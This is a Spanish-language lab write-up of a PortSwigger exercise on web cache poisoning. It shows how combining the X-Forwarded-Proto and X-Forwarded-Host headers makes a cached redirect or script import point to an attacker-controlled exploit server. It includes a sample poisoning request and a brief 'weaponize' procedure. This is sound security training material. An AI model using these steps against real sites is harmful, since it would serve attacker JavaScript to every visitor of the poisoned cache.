---
aliases:
  - WCP 003 - multiples headers
  - cache poisoning X-Forwarded-Proto redirect
tags:
  - vuln/web-cache-poisoning
  - example
  - portswigger
---

# 003 — Múltiples headers (`X-Forwarded-Proto` + `X-Forwarded-Host`)

> Lab: [Multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers) · **Practitioner** · técnica → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|entry point]]

## Qué muestra
A veces **un header unkeyed solo no alcanza**: necesitás **dos combinados**. Uno **dispara el comportamiento** (`X-Forwarded-Proto`/`X-Forwarded-Scheme` hace creer a la app que la conexión NO es HTTPS → emite un **redirect**) y el otro (`X-Forwarded-Host`) **controla el destino/host** de ese redirect o del recurso importado.

## Request → Response

```http
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http
X-Forwarded-Host: exploit-0a55...exploit-server.net/test
```

```http
HTTP/1.1 301 Moved Permanently
Location: https://innocent-site.com/random
```

## Por qué funciona
- **`X-Forwarded-Proto: http`** (o `X-Forwarded-Scheme` con cualquier valor ≠ `https`) le dice a la app que el cliente entró por **HTTP** → responde con un **redirect a HTTPS** (comportamiento de "forzar TLS"). Ese es el **gatillo**.
- Recién cuando la app entra en esa rama, **usa `X-Forwarded-Host`** para reconstruir la URL absoluta (del redirect o del import). Combinando ambos, dirigís el destino a **tu server**.
- Ambos headers son **unkeyed** → la respuesta resultante se **cachea** y se sirve a todos.

> En este snapshot el `Location` todavía muestra `innocent-site.com` (solo confirmaste el **gatillo** del redirect con `X-Forwarded-Proto`). El paso siguiente es sumar `X-Forwarded-Host` para que el host del `Location`/import pase a ser el tuyo.

## Cómo explotarlo (weaponize)
1. **Descubrí el gatillo:** mandá `X-Forwarded-Proto: http` y observá el `301/302` (la app cambia de comportamiento).
2. **Sumá el host:** `X-Forwarded-Host: TU-exploit-server` junto con el Proto → la URL reconstruida (redirect o `<script src>`) apunta a tu server.
3. Serví tu JS en el path que quede en el import y **cacheá** la respuesta (sin cache buster).

## Verificación
- La respuesta cacheada (`X-Cache: hit`) trae el `Location`/import apuntando a **tu host**.

## Detalles que se pasan por alto
- **`X-Forwarded-Proto` vs `X-Forwarded-Scheme`:** según la app, el header que dispara el redirect es uno u otro (probá ambos). El valor solo tiene que **no ser `https`**.
- **La gracia es la combinación:** por separado, el Host no se usa (no entra en esa rama) y el Proto solo redirige. Juntos = poisoning.
- Distinto de [[vulnerabilities/030-web-cache-poisoning/examples/002-xfh-script-import|002]], donde **un** header ya bastaba.

→ Siguiente: [[vulnerabilities/030-web-cache-poisoning/examples/004-host-header-injection-redirect|004 · Host header reflejado en el redirect]]
